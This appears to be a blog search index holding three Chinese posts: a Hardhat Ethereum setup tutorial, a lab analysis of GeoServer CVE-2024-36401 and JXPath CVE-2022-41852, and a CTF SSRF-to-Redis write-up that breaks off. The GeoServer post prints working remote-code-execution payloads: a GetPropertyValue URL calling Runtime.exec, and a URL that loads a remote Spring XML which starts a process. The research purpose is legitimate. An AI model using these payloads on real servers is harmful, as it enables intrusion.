<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mac搭建hardhat以太坊开发环境</title>
      <link href="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h2 id="Node环境配置"><a href="#Node环境配置" class="headerlink" title="Node环境配置"></a>Node环境配置</h2><p>首先安装<code>nvm</code>，再安装<code>node18</code>，为了和<code>hardhat</code>的运行环境匹配</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install nvm</span><br></pre></td></tr></table></figure><p>配置nvm环境，在<code>～/.zshrc</code>中加入下面的内容。</p><p>编辑<code>～/.zshrc</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure><p>加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export NVM_DIR=&quot;$HOME/.nvm&quot;</span><br><span class="line">[ -s &quot;/opt/homebrew/opt/nvm/nvm.sh&quot; ] &amp;&amp; \. &quot;/opt/homebrew/opt/nvm/nvm.sh&quot;  # This loads nvm</span><br><span class="line">[ -s &quot;/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm&quot; ] &amp;&amp; \. &quot;/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm&quot;  # This loads nvm bash_completion</span><br></pre></td></tr></table></figure><p>保存，并</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><p>配置好后，如下：</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113214138233.png" alt="image-20250113214138233"></p><p>接下来，安装<code>node18</code>，使用下面命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install 18</span><br></pre></td></tr></table></figure><p>如下，安装成功。</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113214511440.png" alt="image-20250113214511440"></p><h2 id="搭建hardhat环境"><a href="#搭建hardhat环境" class="headerlink" title="搭建hardhat环境"></a>搭建hardhat环境</h2><p>创建一个目录，专门用于以太坊学习，随意，如<code>/Web3</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /Web3</span><br><span class="line">mkdir hardhat-simple-contract</span><br><span class="line">cd hardhat-simple-contract</span><br><span class="line">npm init -y</span><br><span class="line">npm install --save-dev hardhat</span><br></pre></td></tr></table></figure><p>然后初始化<code>hardhat</code>项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat</span><br></pre></td></tr></table></figure><p>选择第一个创建一个<code>JavaScript project</code>，项目路径选择刚开始创建文件夹的路径。</p><p>注意⚠️我这里是换了一个路径演示一下。</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113232445250.png" alt="image-20250113232445250"></p><p>初始化后的文件目录如下：</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113234740753.png" alt="image-20250113234740753"></p><p>其中的<code>scripts</code>文件夹需要自己创建。</p><h2 id="部署智能合约"><a href="#部署智能合约" class="headerlink" title="部署智能合约"></a>部署智能合约</h2><p>进入到文件夹<code>contracts</code>下，创建合约文件<code>SimpleStorage.sol</code>，简单的部署一个合约，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint256 private storedValue;</span><br><span class="line"></span><br><span class="line">    event ValueChanged(uint256 newValue);</span><br><span class="line"></span><br><span class="line">    function set(uint256 value) public &#123;</span><br><span class="line">        storedValue = value;</span><br><span class="line">        emit ValueChanged(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get() public view returns (uint256) &#123;</span><br><span class="line">        return storedValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进入到创建的<code>scripts</code>文件夹下，创建部署合约的脚本<code>deploy.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hre = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 获取合约工厂</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">SimpleStorage</span> = <span class="keyword">await</span> hre.<span class="property">ethers</span>.<span class="title function_">getContractFactory</span>(<span class="string">&quot;SimpleStorage&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 部署合约</span></span><br><span class="line">    <span class="keyword">const</span> simpleStorage = <span class="keyword">await</span> <span class="title class_">SimpleStorage</span>.<span class="title function_">deploy</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 等待部署完成</span></span><br><span class="line">    <span class="keyword">await</span> simpleStorage.<span class="title function_">waitForDeployment</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取合约地址</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`SimpleStorage deployed to: <span class="subst">$&#123;simpleStorage.target&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">main</span>()</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> process.<span class="title function_">exit</span>(<span class="number">0</span>))</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">      process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>首先需要对编写的智能合约进行编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat compile</span><br></pre></td></tr></table></figure><p>编译成功后，会输出<code>Compiled 2 Solidity files successfully (evm target: paris)</code></p><p>然后启动本地的以太坊网络，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat node</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113221945116.png" alt="image-20250113221945116"></p><p>以太坊网络启动成功。</p><p>进行合约的部署，执行部署的js文件如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat run scripts/deploy.js --network localhost</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113222224915.png" alt="image-20250113222224915"></p><p>合约成功部署，得到部署合约的地址<code>0x5fbdb2315678afecb367f032d93f642f64180aa3</code>。</p><h2 id="调用合约函数"><a href="#调用合约函数" class="headerlink" title="调用合约函数"></a>调用合约函数</h2><p>创建一个调用合约的代码<code>test.js</code>，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scripts/test.js</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">SimpleStorage</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractAt</span>(<span class="string">&quot;SimpleStorage&quot;</span>, <span class="string">&quot;0x5fbdb2315678afecb367f032d93f642f64180aa3&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在这里继续编写脚本逻辑，例如读取或调用合约方法</span></span><br><span class="line">    <span class="keyword">const</span> value = <span class="keyword">await</span> <span class="title class_">SimpleStorage</span>.<span class="title function_">set</span>(<span class="number">42</span>); <span class="comment">// 假设你的合约有一个 `get` 方法</span></span><br><span class="line">    <span class="comment">//const value = await SimpleStorage.get()</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Stored value:&quot;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 捕获错误</span></span><br><span class="line"><span class="title function_">main</span>().<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    process.<span class="property">exitCode</span> = <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将其保存在<code>scripts</code>文件夹下。</p><p>代码的大致意思是，调用合约的<code>set</code>函数方法，设置值为<code>42</code>，然后再调用<code>get</code>方法去读取数据。</p><p>先是调用<code>set</code>方法，如图所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat run scripts/test.js  --network localhost</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113235445672.png" alt="image-20250113235445672"></p><p>然后再调用<code>get</code>方法，获取<code>set</code>的值。</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113235806214.png" alt="image-20250113235806214"></p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 以太坊 </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeoServer代码执行漏洞(CVE-2024-36401)</title>
      <link href="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/"/>
      <url>/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/</url>
      
        <content type="html"><![CDATA[<h2 id="配置调试环境"><a href="#配置调试环境" class="headerlink" title="配置调试环境"></a>配置调试环境</h2><p>调试漏洞的GeoServer版本号为2.23.2，获取源代码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/geoserver/geoserver #下载</span><br><span class="line">git tag #查看全部的版本</span><br><span class="line">git checkout tags/2.23.2 #切换至2.23.2版本</span><br></pre></td></tr></table></figure><p>使用vulhub进行漏洞的远程调试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/vulhub/geoserver/CVE-2024-36401/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>IntelliJ IDEA打开geoserver的源代码，添加运行Remote JVM Debug，端口默认为5005。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109204237470.png" alt="image-20250109204237470"></p><p>然后对代码进行断点调试。</p><h2 id="浅析代码"><a href="#浅析代码" class="headerlink" title="浅析代码"></a>浅析代码</h2><h3 id="官方通告"><a href="#官方通告" class="headerlink" title="官方通告"></a>官方通告</h3><p>漏洞通告：</p><p><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a><br>GeoTool组件通告：</p><p><a href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a><br>Jxpath漏洞利用：</p><p><a href="https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852">https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852</a></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109220637144.png" alt="image-20250109220637144"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109220231306.png" alt="image-20250109220231306"></p><p>从官方的通报中可以注意到，若XPath表达式由用户输入提供，则会出现安全问题。存在安全问题的接口为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class&lt;T&gt;)</span><br><span class="line">org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)</span><br><span class="line">org.geotools.data.complex.expression.MapPropertyAccessorFactory.<span class="keyword">new</span> <span class="title class_">PropertyAccessor</span>() &#123;...&#125;.get(Object, String, Class&lt;T&gt;)</span><br><span class="line">org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)</span><br></pre></td></tr></table></figure><p>测试样例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">org</span>.geotools.xsd.StreamingParser(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">org</span>.geotools.filter.v1_0.OGCConfiguration(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayInputStream(<span class="string">&quot;&lt;Filter&gt;&lt;/Filter&gt;&quot;</span>.getBytes()),</span><br><span class="line">                <span class="string">&quot;java.lang.Thread.sleep(5000)&quot;</span>)</span><br><span class="line">        .parse();</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>若用户输入的参数，传输到了这些存在漏洞的类中，参数会经过JXPath引擎去进行解析，从而导致代码执行。漏洞本质是JXPath漏洞，JXpath漏洞是Apache Commons JXPath之前爆出的漏洞（CVE-2022-41852），这个JXPath对传统的XPath语句进行了拓展，支持XPath语句中插入一些表达式语言的特性，能够调用任意public的静态方法等导致任意代码执行。</p><p>官网给出的可能存在漏洞的请求</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">WFS GetFeature</span><br><span class="line">WFS GetPropertyValue</span><br><span class="line">WMS GetMap</span><br><span class="line">WMS GetFeatureInfo</span><br><span class="line">WMS GetLegendGraphic</span><br><span class="line">WPS Execut</span><br></pre></td></tr></table></figure><p>查询官网</p><p><a href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html</a></p><p>WFS GetPropertyValue请求如下：</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109222248139.png" alt="image-20250109222248139"></p><p>GET请求即可触发漏洞：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),%27touch%20/tmp/success2%27)</span><br></pre></td></tr></table></figure><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109222510886.png" alt="image-20250109222510886"></p><h3 id="定位漏洞"><a href="#定位漏洞" class="headerlink" title="定位漏洞"></a>定位漏洞</h3><p>由前面可知，GetPropertyValue是我们要定位的位置，找到类的位置。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223053220.png" alt="image-20250109223053220"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223140901.png"></p><p>对run方法进行断点，进行单步调试，定位到代码propertyNameNoIndexes.evaluate处，这里调用了geotool的evaluate方法，跟进</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223804405.png" alt="image-20250109223804405"></p><p>发现org.geotools.filter.AttributeExpressionImpl#evaluate(java.lang.Object, java.lang.Class<T>)中调用了accessor.get，再跟进</T></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109225119903.png" alt="image-20250109225119903"></p><p>这里调用了存在漏洞的<code>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor#get</code>触发了漏洞。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109225403954.png" alt="image-20250109225403954"></p><h3 id="CVE-2022-41852-XPath漏洞"><a href="#CVE-2022-41852-XPath漏洞" class="headerlink" title="CVE-2022-41852 XPath漏洞"></a>CVE-2022-41852 XPath漏洞</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Apache Commons JXPath安全漏洞，攻击者可以利用除compile()和compilePath()函数之外的所有处理XPath字符串的JXPathContext等函数通过XPath表达式从类路径加载任何Java类，从而执行恶意代码。</p><p>JXPath及用法：</p><p><a href="https://commons.apache.org/proper/commons-jxpath/users-guide.html">https://commons.apache.org/proper/commons-jxpath/users-guide.html</a></p><h4 id="利用范围"><a href="#利用范围" class="headerlink" title="利用范围"></a>利用范围</h4><p>Apache Commons JXPath &lt;&#x3D; 1.3</p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>下载POC：<a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></p><p>POC使用Spring框架，简单实现接受用户输入并使用它从Person类中检索指定的数据。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110115215618.png" alt="image-20250110115215618"></p><p>启动Spring，在本地创建一个test.xml，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;commandRunner&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>open<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>-a<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地再开启一个80端口，用于远程加载test.xml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/vulnerable-example?path=org.springframework.context.support.ClassPathXmlApplicationContext.new(%22http://127.0.0.1/test.xml%22)</span><br></pre></td></tr></table></figure><p>开启调试，断点，调用了org.apache.commons.jxpath.JXPathContext#getValue(java.lang.String)方法，跟进</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130016519.png" alt="image-20250110130016519"></p><p>跟进org.apache.commons.jxpath.ri.compiler.Expression#computeValue</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130144114.png" alt="image-20250110130144114"></p><p>继续跟进到org.apache.commons.jxpath.Function#invoke函数中，实现了Spring-Bean加载，执行恶意代码。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130533234.png" alt="image-20250110130533234"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110131339598.png" alt="image-20250110131339598"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>CVE-2024-36401参考：</p><p><a href="https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/README.zh-cn.md</a></p><p><a href="https://www.bilibili.com/video/BV1bb421n7M2/?share_source=copy_web&vd_source=40fffae7c3c0198962dc9cf9689a1a8a">https://www.bilibili.com/video/BV1bb421n7M2/?share_source=copy_web&amp;vd_source=40fffae7c3c0198962dc9cf9689a1a8a</a></p><p><a href="https://xz.aliyun.com/t/14991">https://xz.aliyun.com/t/14991</a></p><p>CVE-2022-41852参考：</p><p><a href="https://www.anquanke.com/post/id/281941">https://www.anquanke.com/post/id/281941</a></p><p><a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> RCE </tag>
            
            <tag> XPath </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF刷题篇2</title>
      <link href="/2024/07/25/CTF%E5%88%B7%E9%A2%98%E7%AF%872/"/>
      <url>/2024/07/25/CTF%E5%88%B7%E9%A2%98%E7%AF%872/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF打Redis"><a href="#SSRF打Redis" class="headerlink" title="SSRF打Redis"></a>SSRF打Redis</h2><p>CTF show的WEB入门360关卡，打Redis。</p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现6379端口开放，6379端口，一般为Redis。</p><p><img src="/2024/07/25/CTF%E5%88%B7%E9%A2%98%E7%AF%872/1.png"></p><p>打入Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 